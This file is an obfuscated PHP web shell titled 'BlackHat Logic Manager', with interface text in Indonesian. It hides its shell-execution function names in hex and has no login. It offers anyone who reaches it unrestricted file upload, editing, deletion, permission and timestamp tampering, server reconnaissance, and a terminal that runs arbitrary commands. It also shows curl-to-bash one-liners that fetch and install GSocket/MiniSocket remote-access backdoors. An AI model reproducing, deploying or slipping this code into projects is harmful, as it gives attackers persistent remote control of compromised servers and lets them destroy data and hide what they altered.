<?php
error_reporting(0);
session_start();
$c8 = array( "426c61636b486174204c6f676963204d616e61676572", "676574637764", "7363616e646972", "737072696e7466", "66696c655f6765745f636f6e74656e7473", "66696c655f7075745f636f6e74656e7473", "66696c6573697a65", "66696c657065726d73", "64617465", "66696c656d74696d65", "69735f646972", "69735f66696c65", "69735f7265616461626c65", "69735f7772697461626c65", "66696c655f657869737473", "6d6b646972", "72656e616d65", "756e6c696e6b", "726d646972", "636f7079", "63686d6f64", "746f756368", "737472746f74696d65", "6469726e616d65", "626173656e616d65", "70617468696e666f", "68746d6c7370656369616c6368617273", "75726c656e636f6465", "6d6435", "736f7274", "61727261795f64696666", "707265675f73706c6974", "7374725f7265706c616365", "7374725f746f6c6f776572", "73747269706f73", "677a6976657265", "6f6374646563", "67657463757272656e745f75736572", "7068705f756e616d65", "70687076657273696f6e", "7368656c6c5f65786563", "65786563", "73797374656d", "7061737374687275", "706f7369785f6765747077756964", "66696c656f776e6572", "6573636170657368656c6c617267", "7472696d", "61776b", "696e695f676574", "64697361626c655f66756e6374696f6e73", "676574686f737462796e616d65", "6d625f6465746563745f656e636f64696e67" );
$lE = 0;
T4: if (!($lE < count($c8))) { goto Je; }
$c8[$lE] = Jd($c8[$lE]);
Cy: $lE++;
goto T4;
Je:
function Ss($SP) { $dE = ""; $lE = 0; NZ: if (!($lE < strlen($SP))) { goto Xc; } $dE .= dechex(ord($SP[$lE])); WK: $lE++; goto NZ; Xc: return $dE; }
function Jd($SP) { $dE = ""; $gf = strlen($SP) - 1; $lE = 0; Xp: if (!($lE < $gf)) { goto ur; } $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1])); Wn: $lE += 2; goto Xp; ur: return $dE; }
$APP_NAME = $c8[0];
$BASE_PATH = $c8[1]();
function perms($file){ 
    global $c8;
    return $c8[3]('%04o', $c8[7]($file) & 0777);
}
function owner($file){
    global $c8;
    if(function_exists($c8[44])){
        $uid = $c8[45]($file);
        $info = $c8[44]($uid);
        return $info['name'];
    } elseif(function_exists($c8[40])){
        $cmd = 'ls -ld ' . $c8[46]($file) . ' | ' . $c8[48]("'{print $3}'");
        $owner = $c8[40]($cmd);
        return $c8[47]($owner);
    }
    return 'unknown';
}
function getFileDate($file, $format = 'F d Y H:i:s'){ 
    global $c8;
    return $c8[8]($format, $c8[9]($file)); 
}

function isWritable($file){ 
    global $c8;
    return $c8[13]($file); 
}
function isReadable($file){ 
    global $c8;
    return $c8[12]($file); 
}
function formatSize($bytes){
    if($bytes>=1073741824) return number_format($bytes/1073741824,2).' GB';
    elseif($bytes>=1048576) return number_format($bytes/1048576,2).' MB';
    elseif($bytes>=1024) return number_format($bytes/1024,2).' KB';
    elseif($bytes>1) return $bytes.' B';
    elseif($bytes==1) return '1 B';
    else return '0 B';
}
function exe($cmd, $cwd = null){ 
    global $c8;
    $cmd = "(" . $cmd . ") 2>&1"; 
    if($cwd) { 
        $cmd = "cd " . $c8[46]($cwd) . " && " . $cmd; 
    } 
    if(function_exists($c8[40])) { 
        $result = $c8[40]($cmd); 
        if($result === null || $result === false) { 
            return "Command executed (no output)"; 
        } 
        return $result; 
    } elseif(function_exists($c8[41])){ 
        exec($cmd, $o, $return_var); 
        $output = implode("\n", $o); 
        if($return_var !== 0 && empty($output)) { 
            return "Command failed with return code: " . $return_var; 
        } 
        return $output ?: "Command executed (no output)"; 
    } elseif(function_exists($c8[42])){ 
        ob_start(); 
        $c8[42]($cmd, $return_var); 
        $o = ob_get_clean(); 
        if($return_var !== 0 && empty($o)) { 
            return "Command failed with return code: " . $return_var; 
        } 
        return $o ?: "Command executed (no output)"; 
    } elseif(function_exists($c8[43])){ 
        ob_start(); 
        $c8[43]($cmd, $return_var); 
        $o = ob_get_clean(); 
        if($return_var !== 0 && empty($o)) { 
            return "Command failed with return code: " . $return_var; 
        } 
        return $o ?: "Command executed (no output)"; 
    } 
    return "Command execution not available."; 
}

function getServerIP(){
    global $c8;
    if(!empty($_SERVER['SERVER_ADDR'])) return $_SERVER['SERVER_ADDR'];
    elseif(function_exists($c8[51])) return $c8[51]($_SERVER['SERVER_NAME']);
    return 'Unknown';
}

function getSystemInfo(){
    global $c8;
    if(function_exists($c8[38])) return $c8[38]();
    elseif(function_exists($c8[40])) return $c8[47]($c8[40]("uname -a"));
    return 'Unknown';
}

function getCurrentUser(){
    global $c8;
    if(function_exists($c8[44]) && function_exists('posix_geteuid')){
        $user = $c8[44](posix_geteuid());
        return $user['name'];
    } elseif(function_exists($c8[37])) return $c8[37]();
    elseif(function_exists($c8[40])) return $c8[47]($c8[40]("whoami"));
    return 'Unknown';
}

function getServerSoftware(){
    return $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
}

function unzipFile($zipFile, $destPath) {
    global $c8;
    $zip = new ZipArchive;
    if ($zip->open($zipFile) === TRUE) {
        $zip->extractTo($destPath);
        $zip->close();
        return true;
    }
    return false;
}

$path = isset($_GET['path']) ? $_GET['path'] : $BASE_PATH;
$path = str_replace("\\","/",$path);
$paths = explode("/",$path);
$msg = "";
$msgType = "";

if(isset($_FILES['file'])){
    $dest = $path.'/'.$_FILES['file']['name'];
    if($c8[19]($_FILES['file']['tmp_name'], $dest)){
        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dest);
        $fileUrl = $relativePath;
        $msg = "Upload Berhasil: <a href='".$fileUrl."' target='_blank'>".$_FILES['file']['name']."</a>";
        $msgType = "success";
    } else {
        $msg = "Upload Gagal!";
        $msgType = "error";
    }
}

if(isset($_POST["newfile"])){
    $newFile = $path.'/'.$_POST["newfile"];
    $result = $c8[5]($newFile, "");
    if($result !== false){
        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $newFile);
        $fileUrl = $relativePath;
        $msg = "File dibuat: <a href='".$fileUrl."' target='_blank'>".$_POST["newfile"]."</a>";
        $msgType = "success";
    } else {
        $msg = "Gagal membuat file!";
        $msgType = "error";
    }
}

if(isset($_POST["newfolder"])){
    if($c8[15]($path.'/'.$_POST["newfolder"])){
        $msg = "Folder dibuat: ".$_POST["newfolder"];
        $msgType = "success";
    } else {
        $msg = "Gagal membuat folder!";
        $msgType = "error";
    }
}

if(isset($_POST["delete"])){
    $t=$_POST["target"];
    $deleted = false;
    if($c8[10]($t)){
        function deleteDirectory($dir) {
            global $c8;
            if(!$c8[14]($dir)) return true;
            if(!$c8[10]($dir)) return $c8[17]($dir);
            foreach($c8[2]($dir) as $item) {
                if($item == '.' || $item == '..') continue;
                if(!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
            }
            return $c8[18]($dir);
        }
        $deleted = deleteDirectory($t);
    } else {
        $deleted = @$c8[17]($t);
    }
    
    if($deleted){
        $msg = "Dihapus: ".$c8[24]($t);
        $msgType = "success";
    } else {
        $msg = "Gagal menghapus!";
        $msgType = "error";
    }
}

if(isset($_POST["rename"])){
    if($c8[16]($_POST["oldname"], $c8[23]($_POST["oldname"]).'/'.$_POST["newname"])){
        $msg = "Rename berhasil";
        $msgType = "success";
    } else {
        $msg = "Rename gagal!";
        $msgType = "error";
    }
}

if(isset($_POST["chmod"])){
    if($c8[20]($_POST["target"], $c8[36]($_POST["perm"]))){
        $msg = "Chmod berhasil";
        $msgType = "success";
    } else {
        $msg = "Chmod gagal!";
        $msgType = "error";
    }
}

if(isset($_POST["savefile"])){
    if($c8[5]($_POST["target"], $_POST["src"])){
        $msg = "File disimpan";
        $msgType = "success";
    } else {
        $msg = "Gagal menyimpan file!";
        $msgType = "error";
    }
}

if(isset($_POST["changedate"])){
    $t = $c8[22]($_POST["newdate"]);
    if($t && $c8[21]($_POST["target"], $t)){
        $msg = "Tanggal diubah";
        $msgType = "success";
    } else {
        $msg = "Gagal mengubah tanggal!";
        $msgType = "error";
    }
}

if(isset($_POST["unzip"])){
    $zipFile = $_POST["target"];
    $destPath = $c8[23]($zipFile);
    if(class_exists('ZipArchive')) {
        if(unzipFile($zipFile, $destPath)) {
            $msg = "File ZIP berhasil diekstrak ke: " . $c8[24]($destPath);
            $msgType = "success";
        } else {
            $msg = "Gagal mengekstrak file ZIP!";
            $msgType = "error";
        }
    } else {
        $cmd = "unzip -o " . $c8[46]($zipFile) . " -d " . $c8[46]($destPath);
        $result = exe($cmd);
        if($result !== false) {
            $msg = "File ZIP berhasil diekstrak (via command line)";
            $msgType = "success";
        } else {
            $msg = "ZipArchive tidak tersedia dan command unzip gagal!";
            $msgType = "error";
        }
    }
}

$terminal_output = "";
$showTerminal = isset($_POST["toggle_terminal"]) ? true : false;
$showGSocket = isset($_POST["show_gsocket"]) ? true : false;
$showMiniSocket = isset($_POST["show_minisocket"]) ? true : false;

if(isset($_POST["execmd"])){ 
    $terminal_output = exe($_POST["cmd"], $path); 
    $showTerminal = true;
}

function getFileExtension($file){
    global $c8;
    return $c8[33]($c8[25]($file, PATHINFO_EXTENSION));
}

$disableFunctions = $c8[49]($c8[50]);
$disableFunctionsText = $disableFunctions ?: 'Aman';
$disableFunctionsColor = ($disableFunctionsText == 'Aman') ? '#00ff00' : '#ff4444';

$p = $c8[10];
$y = $c8[6];
$ae = $c8[4];
$hs = $c8[26];

// Function to display breadcrumb (to avoid code duplication)
function showBreadcrumb($paths) {
    global $c8;
    ?>
    <div class="breadcrumb">
        <i class="fas fa-folder"></i>
        <?php
        foreach($paths as $id=>$pat){
            if($pat=='' && $id==0){
                echo '<a href="?path=/"><i class="fas fa-hdd"></i> /</a>';
                continue;
            }
            if($pat=='') continue;
            echo ' <i class="fas fa-chevron-right"></i> <a href="?path=';
            for($i=0;$i<=$id;$i++){
                echo $paths[$i];
                if($i!=$id) echo "/";
            }
            echo '">'.$pat.'</a>';
        }
        ?>
    </div>
    <?php
}
?>
<!DOCTYPE html>
<html>
<head>
<title><?=$APP_NAME?></title>
<meta name="robots" content="noindex, nofollow">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
*{box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#0d0d0d;color:#eee;margin:0;padding:0;font-size:14px}h1{color:#fff;text-align:center;padding:15px 0;margin:0;font-size:26px;font-weight:500;background:#111;border-bottom:1px solid #333}h1 i{color:#f1c40f;margin-right:10px}a{color:#f1c40f;text-decoration:none}a:hover{color:#e67e22;text-decoration:none}table{border-collapse:collapse;background:#0d0d0d;width:100%;table-layout:fixed}td,th{padding:8px 12px;border-bottom:1px solid #333;vertical-align:middle;overflow:hidden;text-overflow:ellipsis}th{background:#1a1a1a;color:#f1c40f;text-transform:uppercase;font-weight:600;font-size:12px;letter-spacing:.5px;white-space:nowrap}td:nth-child(1),th:nth-child(1){width:40%}td:nth-child(2),th:nth-child(2){width:8%}td:nth-child(3),th:nth-child(3){width:18%}td:nth-child(4),td:nth-child(6),th:nth-child(4),th:nth-child(6){width:12%}td:nth-child(5),th:nth-child(5){width:10%}th:first-child,th:nth-child(2),th:nth-child(3),th:nth-child(4){text-align:left}td:last-child,th:last-child,th:nth-child(5){text-align:center}td{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}td:first-child{word-break:break-word;white-space:normal;word-break:break-word;max-width:300px}tr:hover{background:#1a1a1a}td:first-child a{color:#fff;display:inline-flex;align-items:center;gap:8px}td:first-child a i{width:18px;font-size:14px;flex-shrink:0}td:nth-child(5){font-family:'Courier New',Consolas,monospace;font-weight:600;font-size:13px;text-align:center}.action-icons{display:inline-flex;gap:4px;align-items:center}.btn-icon{background:0 0;border:none;padding:4px 6px;margin:0;color:#fff;font-size:14px;cursor:pointer;border-radius:4px;transition:.2s}.btn-icon:hover{background:#333;color:#f1c40f}.btn-icon.delete:hover{color:#f44;background:#333}.btn-icon.unzip:hover{color:#0f0;background:#333}.file-link{color:#fff;text-decoration:none;display:inline-flex;align-items:center;gap:8px}.fa-folder,.file-link:hover{color:#f1c40f}.fa-file{color:#3498db}td:nth-child(4){max-width:180px;overflow:hidden;text-overflow:ellipsis}input,select,textarea{background:#1a1a1a;color:#fff;border:1px solid #444;border-radius:4px;padding:6px 12px;font-size:13px}textarea{width:100%;height:500px;font-family:'Courier New',monospace;background:#0d0d0d}button{cursor:pointer;background:#f1c40f;color:#000;border:none;font-weight:500;padding:6px 12px;border-radius:4px}button:hover{background:#e67e22;color:#000}.breadcrumb{padding:10px 20px;background:#111;border-bottom:1px solid #333;font-size:13px}.breadcrumb i{color:#f1c40f;margin:0 5px}.msg-box{padding:10px 20px;background:#111;margin:15px 0;font-size:13px;border-radius:4px}.msg-box.success{border-left:4px solid #0f0;color:#0f0}.msg-box.error{border-left:4px solid #f44;color:#f44}.msg-box i{margin-right:8px}.server-panel{background:#111;border:1px solid #333;border-radius:6px;padding:15px 20px;margin:0 20px 15px}.server-panel .info-row{display:flex;margin-bottom:8px;font-size:13px}.server-panel .info-row i{color:#f1c40f;width:25px;margin-right:10px}.server-panel .info-row .label{width:140px;color:#888}.server-panel .info-row .value{color:#fff;word-break:break-all;flex:1}.terminal-panel{margin:0 20px 15px}.terminal-panel textarea{width:100%;height:300px;background:#0d0d0d;color:#fff;border:1px solid #444;font-family:'Courier New',monospace;font-size:12px;padding:10px;resize:vertical}.info-box{padding:12px 20px;background:#111;border-bottom:1px solid #333;margin:0;display:flex;align-items:center;flex-wrap:wrap;gap:15px;font-size:13px}.info-box i{color:#f1c40f;margin-right:6px;width:18px}.info-box span{margin-left:auto;display:flex;gap:8px;align-items:center}.server-btn{background:#1a1a1a;color:#fff;border:1px solid #444;padding:5px 12px;cursor:pointer;border-radius:4px;font-size:13px}.server-btn:hover{background:#e67e22;color:#000;border-color:#e67e22}.server-btn.active{background:#e67e22;color:#000}.home-btn{background:0 0;color:#f1c40f;border:1px solid #f1c40f;padding:5px 14px;cursor:pointer;border-radius:4px;font-size:13px}.home-btn:hover{background:#e67e22;color:#000;border-color:#e67e22}.action-bar{padding:10px 20px;background:#111;border-bottom:1px solid #333;display:flex;gap:20px;flex-wrap:wrap;font-size:13px}.container{padding:0 20px 20px;overflow-x:auto}.modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);z-index:1999}.modal{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#0d0d0d;border-radius:6px;padding:25px;z-index:2000;width:450px;box-shadow:0 5px 30px rgba(0,0,0,.7);border:1px solid #f1c40f}.modal.large{width:90%;max-width:1200px}.modal h3{margin:0 0 20px;font-size:16px;color:#f1c40f}.modal .close{color:#aaa;float:right;font-size:24px;cursor:pointer}.modal .close:hover{color:#e67e22}.modal input[type=text]{width:100%;padding:10px;background:#1a1a1a;border:1px solid #444;color:#fff;font-size:13px}.modal-footer{padding-top:20px;margin-top:20px;border-top:1px solid #333;text-align:right;display:flex;gap:10px;justify-content:flex-end}.btn-primary{background:#f1c40f;color:#000;border:none;padding:8px 18px;font-size:13px}.btn-primary:hover{background:#e67e22}.btn-secondary{background:#1a1a1a;color:#fff;border:1px solid #444;padding:8px 18px;font-size:13px}.btn-secondary:hover{background:#333}.copyright{text-align:center;padding:15px;color:#666;font-size:12px;border-top:1px solid #333;margin-top:20px}
</style>
<script>
function openModal(id){
    document.getElementById(id).style.display = 'block';
    document.getElementById(id + '_overlay').style.display = 'block';
}
function closeModal(id){
    document.getElementById(id).style.display = 'none';
    document.getElementById(id + '_overlay').style.display = 'none';
}
function goHome(){
    window.location.href = window.location.origin + window.location.pathname;
}
function numberOnly(event){
    var key = (event.which) ? event.which : event.keyCode;
    if(key != 46 && key > 31 && (key < 48 || key > 57)) return false;
    return true;
}
</script>
</head>
<body>

<h1><i class="fas fa-skull"></i> <?=$APP_NAME?></h1>

<div class="info-box">
    <div style="display:flex;align-items:center;gap:20px;flex-wrap:wrap;">
        <i class="fas fa-server"></i> <span>Server Information</span>
    </div>
    <span>
        <form method="POST" style="display:inline;">
            <button type="submit" name="show_gsocket" class="server-btn <?=$showGSocket?'active':''?>">GSocket</button>
        </form>
        <form method="POST" style="display:inline;">
            <button type="submit" name="show_minisocket" class="server-btn <?=$showMiniSocket?'active':''?>">MiniSocket</button>
        </form>
        <form method="POST" style="display:inline;">
            <button type="submit" name="toggle_terminal" class="server-btn <?=$showTerminal?'active':''?>"><i class="fas fa-terminal"></i>Terminal</button>
        </form>
        <button type="button" class="home-btn" onclick="goHome()"><i class="fas fa-home"></i>Home</button>
    </span>
</div>

<div class="server-panel">
    <div class="info-row"><i class="fas fa-network-wired"></i><span class="label">IP :</span><span class="value"><?=getServerIP()?></span></div>
    <div class="info-row"><i class="fas fa-microchip"></i><span class="label">System :</span><span class="value"><?=getSystemInfo()?></span></div>
    <div class="info-row"><i class="fas fa-user"></i><span class="label">User :</span><span class="value"><?=getCurrentUser()?></span></div>
    <div class="info-row"><i class="fab fa-php"></i><span class="label">PHP Version :</span><span class="value"><?=$c8[39]()?></span></div>
    <div class="info-row"><i class="fas fa-server"></i><span class="label">Software :</span><span class="value"><?=getServerSoftware()?></span></div>
    <div class="info-row"><i class="fas fa-ban"></i><span class="label">Disable Functions :</span><span class="value" style="color:<?=$disableFunctionsColor?>;"><?=$disableFunctionsText?></span></div>
    <div class="info-row"><i class="fas fa-folder-open"></i><span class="label">Path :</span><span class="value"><?=$path?></span></div>
</div>

<?php if($showGSocket): ?>
<div class="terminal-panel"><textarea readonly>bash -c "$(curl -fsSL https://gsocket.io/y)"</textarea></div>
<?php endif; ?>

<?php if($showMiniSocket): ?>
<div class="terminal-panel"><textarea readonly>bash -c "$(curl -fsSL https://minisocket.io/bin/x)"</textarea></div>
<?php endif; ?>

<?php 
// BREADCRUMB DI ATAS TERMINAL - HANYA KETIKA TERMINAL TERBUKA
if($showTerminal): 
    showBreadcrumb($paths);
?>

<?php if($showTerminal): ?>
<div class="terminal-panel">
    <form method="POST">
        <div style="display:flex;gap:8px;margin-bottom:10px;">
            <input type="text" name="cmd" placeholder="Enter command..." style="flex:1;background:#1a1a1a;color:#fff;">
            <button type="submit" name="execmd" class="btn-primary"><i class="fas fa-play"></i> Run</button>
        </div>
        <input type="hidden" name="toggle_terminal" value="1">
    </form>
    <?php if($terminal_output): ?>
    <textarea readonly><?=htmlspecialchars($terminal_output)?></textarea>
    <?php else: ?>
    <textarea readonly placeholder="Output will appear here..."></textarea>
    <?php endif; ?>
</div>
<?php endif; ?>

<?php endif; ?>

<?php 
// BREADCRUMK DEFAULT - HANYA KETIKA TERMINAL TIDAK TERBUKA
if(!$showTerminal): 
    showBreadcrumb($paths);
?>

<?php if(!$showTerminal): ?>
<div class="action-bar">
    <form enctype="multipart/form-data" method="POST" style="display:flex;gap:8px;align-items:center;">
        <i class="fas fa-upload" style="color:#f1c40f;"></i>
        <input type="file" name="file" style="width:auto;background:#1a1a1a;">
        <button type="submit">Upload</button>
    </form>
    <form method="POST" style="display:flex;gap:8px;align-items:center;">
        <i class="fas fa-file" style="color:#f1c40f;"></i>
        <input type="text" name="newfile" placeholder="newfile.txt" style="width:140px;background:#1a1a1a;">
        <button type="submit">New File</button>
    </form>
    <form method="POST" style="display:flex;gap:8px;align-items:center;">
        <i class="fas fa-folder-plus" style="color:#f1c40f;"></i>
        <input type="text" name="newfolder" placeholder="newfolder" style="width:140px;background:#1a1a1a;">
        <button type="submit">New Folder</button>
    </form>
</div>
<?php endif; ?>

<?php if($msg): ?>
<div class="msg-box <?=$msgType?>"><i class="fas fa-<?=$msgType=="success"?'check':'exclamation'?>-circle"></i> <?php echo $msg; ?></div>
<?php endif; ?>

<div class="container">
<table>
<thead>
<tr>
<th>Name</th>
<th>Size</th>
<th>Modified</th>
<th>Owner</th>
<th>Permissions</th>
<th>Actions</th>
</tr>
</thead>
<tbody>
<?php
$items = $c8[2]($path);
if($items && is_array($items)) {
    $folders = array();
    $files = array();
    foreach($items as $item) {
        if($item == '.' || $item == '..') continue;
        
        if($p($path . '/' . $item)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    $c8[29]($folders);
    $c8[29]($files);
    
    foreach($folders as $folder) {
        $fullpath = $path . '/' . $folder;
        $perm = perms($fullpath);
        $date = @getFileDate($fullpath);
        if(!$date) $date = '-';
        $owner_name = @owner($fullpath);
        if(!$owner_name) $owner_name = '-';
        
        $renameId = 'renameFolder_' . $c8[28]($fullpath);
        $chmodId = 'chmodFolder_' . $c8[28]($fullpath);
        $chdateId = 'chdateFolder_' . $c8[28]($fullpath);
        
        if(isWritable($fullpath)) $perm_color = '#2ecc71';
        elseif(!isReadable($fullpath)) $perm_color = '#e74c3c';
        else $perm_color = '#ffffff';
        
        echo "<tr>";
        echo "<td><a href='?path=" . $c8[27]($fullpath) . "'><i class='fas fa-folder fa-fw'></i> $folder</a></td>";
        echo "<td>Dir</td>";
        echo "<td>$date</td>";
        echo "<td>$owner_name</td>";
        echo "<td><font color='$perm_color'><b>$perm</b></font></td>";
        echo "<td>
            <div class='action-icons'>
                <button onclick=\"openModal('$renameId')\" class='btn-icon' title='Rename'><i class='fas fa-pen'></i></button>
                <button onclick=\"openModal('$chmodId')\" class='btn-icon' title='Permission'><i class='fas fa-key'></i></button>
                <button onclick=\"openModal('$chdateId')\" class='btn-icon' title='Change Date'><i class='fas fa-calendar-alt'></i></button>
                <form method='POST' style='display:inline;' onsubmit='return confirm(\"Delete $folder?\")'>
                    <input type='hidden' name='target' value='$fullpath'>
                    <button type='submit' name='delete' class='btn-icon delete' title='Delete'><i class='fas fa-trash-alt'></i></button>
                </form>
            </div>
          </div></td>";
        echo "</tr>";
        
        // RENAME MODAL
        echo "<div class='modal-overlay' id='{$renameId}_overlay'></div>
        <div class='modal' id='{$renameId}'>
            <span class='close' onclick='closeModal(\"{$renameId}\")'>&times;</span>
            <h3><i class='fas fa-pen'></i> Rename : $folder</h3>
            <form method='POST'>
                <input type='hidden' name='oldname' value='$fullpath'>
                <div><input type='text' name='newname' value='$folder' style='width:100%;'></div>
                <div class='modal-footer'>
                    <button type='button' class='btn-secondary' onclick='closeModal(\"{$renameId}\")'>Cancel</button>
                    <button type='submit' name='rename' class='btn-primary'>Rename</button>
                </div>
            </form>
        </div>";
        
        // CHMOD MODAL
        echo "<div class='modal-overlay' id='{$chmodId}_overlay'></div>
        <div class='modal' id='{$chmodId}'>
            <span class='close' onclick='closeModal(\"{$chmodId}\")'>&times;</span>
            <h3>Change Permission : $perm | $folder</h3>
            <form method='POST'>
                <input type='hidden' name='target' value='$fullpath'>
                <div><input type='text' name='perm' maxlength='4' onkeypress='return numberOnly(event)' value='$perm' style='width:100%;'></div>
                <div class='modal-footer'>
                    <button type='button' class='btn-secondary' onclick='closeModal(\"{$chmodId}\")'>Cancel</button>
                    <button type='submit' name='chmod' class='btn-primary'>Change</button>
                </div>
            </form>
        </div>";
        
        // CHDATE MODAL
        echo "<div class='modal-overlay' id='{$chdateId}_overlay'></div>
        <div class='modal' id='{$chdateId}'>
            <span class='close' onclick='closeModal(\"{$chdateId}\")'>&times;</span>
            <h3>Change Date : $date | $folder</h3>
            <form method='POST'>
                <input type='hidden' name='target' value='$fullpath'>
                <div><input type='text' name='newdate' value='$date' style='width:100%;'></div>
                <div class='modal-footer'>
                    <button type='button' class='btn-secondary' onclick='closeModal(\"{$chdateId}\")'>Cancel</button>
                    <button type='submit' name='changedate' class='btn-primary'>Change</button>
                </div>
            </form>
        </div>";
    }
    
    foreach($files as $file) {
        $fullpath = $path . '/' . $file;
        $size = @$y($fullpath);
        if($size === false) $size = 0;
        if($size >= 1048576) $size_display = round($size/1048576,2).' MB';
        elseif($size >= 1024) $size_display = round($size/1024,2).' KB';
        else $size_display = $size.' B';
        
        $perm = perms($fullpath);
        $date = @getFileDate($fullpath);
        if(!$date) $date = '-';
        $owner_name = @owner($fullpath);
        if(!$owner_name) $owner_name = '-';
        
        $editId = 'editFile_' . $c8[28]($fullpath);
        $renameId = 'renameFile_' . $c8[28]($fullpath);
        $chmodId = 'chmodFile_' . $c8[28]($fullpath);
        $chdateId = 'chdateFile_' . $c8[28]($fullpath);
        
        if(isWritable($fullpath)) $perm_color = '#2ecc71';
        elseif(!isReadable($fullpath)) $perm_color = '#e74c3c';
        else $perm_color = '#ffffff';
        
        $isZip = (strtolower($c8[25]($fullpath, PATHINFO_EXTENSION)) == 'zip');
        
        $content = '';
        if($c8[11]($fullpath) && $c8[12]($fullpath) && $y($fullpath) < 1024 * 1024){
            $raw = @$ae($fullpath);
            if($raw !== false){
               if(function_exists($c8[52]) && $c8[52]($raw, 'UTF-8, ASCII', true)){
                    $content = $hs($raw);
                } else {
                    $content = '[BINARY FILE]';
                }
            }
        }
        
        echo "<tr>";
        echo "<td><a href='javascript:void(0)' onclick=\"openModal('$editId')\" class='file-link'><i class='fas fa-file fa-fw'></i> $file</a></td>";
        echo "<td>$size_display</div>";
        echo "<td>$date</div>";
        echo "<td>$owner_name</div>";
        echo "<td><font color='$perm_color'><b>$perm</b></font></div>";
        echo "<td>
            <div class='action-icons'>
                <button onclick=\"openModal('$editId')\" class='btn-icon' title='Edit'><i class='fas fa-edit'></i></button>
                <button onclick=\"openModal('$renameId')\" class='btn-icon' title='Rename'><i class='fas fa-pen'></i></button>
                <button onclick=\"openModal('$chmodId')\" class='btn-icon' title='Permission'><i class='fas fa-key'></i></button>
                <button onclick=\"openModal('$chdateId')\" class='btn-icon' title='Change Date'><i class='fas fa-calendar-alt'></i></button>";
        
        if($isZip) {
            echo "<form method='POST' style='display:inline;' onsubmit='return confirm(\"Extract $file?\")'>
                    <input type='hidden' name='target' value='$fullpath'>
                    <button type='submit' name='unzip' class='btn-icon unzip' title='Unzip'><i class='fas fa-file-archive'></i></button>
                  </form>";
        }
        
        echo "<form method='POST' style='display:inline;' onsubmit='return confirm(\"Delete $file?\")'>
                <input type='hidden' name='target' value='$fullpath'>
                <button type='submit' name='delete' class='btn-icon delete' title='Delete'><i class='fas fa-trash-alt'></i></button>
              </form>
            </div>
          </div></td>";
        echo "</tr>";
        
        // EDIT MODAL
        echo "<div class='modal-overlay' id='{$editId}_overlay'></div>
        <div class='modal large' id='{$editId}'>
            <span class='close' onclick='closeModal(\"{$editId}\")'>&times;</span>
            <h3><i class='fas fa-edit'></i> Edit File : <font color='#00ff00'>$file</font> | Size : $size_display</h3>
            <form method='POST'>
                <textarea name='src' style='height:600px;width:100%;font-size:13px;'>{$content}</textarea>
                <input type='hidden' name='target' value='$fullpath'>
                <div class='modal-footer'>
                    <button type='button' class='btn-secondary' onclick='closeModal(\"{$editId}\")'>Cancel</button>
                    <button type='submit' name='savefile' class='btn-primary'><i class='fas fa-save'></i> Save</button>
                </div>
            </form>
        </div>";
        
        // RENAME MODAL
        echo "<div class='modal-overlay' id='{$renameId}_overlay'></div>
        <div class='modal' id='{$renameId}'>
            <span class='close' onclick='closeModal(\"{$renameId}\")'>&times;</span>
            <h3><i class='fas fa-pen'></i> Rename : $file</h3>
            <form method='POST'>
                <input type='hidden' name='oldname' value='$fullpath'>
                <div><input type='text' name='newname' value='$file' style='width:100%;'></div>
                <div class='modal-footer'>
                    <button type='button' class='btn-secondary' onclick='closeModal(\"{$renameId}\")'>Cancel</button>
                    <button type='submit' name='rename' class='btn-primary'>Rename</button>
                </div>
            </form>
        </div>";
        
        // CHMOD MODAL
        echo "<div class='modal-overlay' id='{$chmodId}_overlay'></div>
        <div class='modal' id='{$chmodId}'>
            <span class='close' onclick='closeModal(\"{$chmodId}\")'>&times;</span>
            <h3>Change Permission : $perm | $file</h3>
            <form method='POST'>
                <input type='hidden' name='target' value='$fullpath'>
                <div><input type='text' name='perm' maxlength='4' onkeypress='return numberOnly(event)' value='$perm' style='width:100%;'></div>
                <div class='modal-footer'>
                    <button type='button' class='btn-secondary' onclick='closeModal(\"{$chmodId}\")'>Cancel</button>
                    <button type='submit' name='chmod' class='btn-primary'>Change</button>
                </div>
            </form>
        </div>";
        
        // CHDATE MODAL
        echo "<div class='modal-overlay' id='{$chdateId}_overlay'></div>
        <div class='modal' id='{$chdateId}'>
            <span class='close' onclick='closeModal(\"{$chdateId}\")'>&times;</span>
            <h3>Change Date : $date | $file</h3>
            <form method='POST'>
                <input type='hidden' name='target' value='$fullpath'>
                <div><input type='text' name='newdate' value='$date' style='width:100%;'></div>
                <div class='modal-footer'>
                    <button type='button' class='btn-secondary' onclick='closeModal(\"{$chdateId}\")'>Cancel</button>
                    <button type='submit' name='changedate' class='btn-primary'>Change</button>
                </div>
            </form>
        </div>";
    }
}
?>
</tbody>
</table>
</div>
<?php endif; ?>
</body>
</html>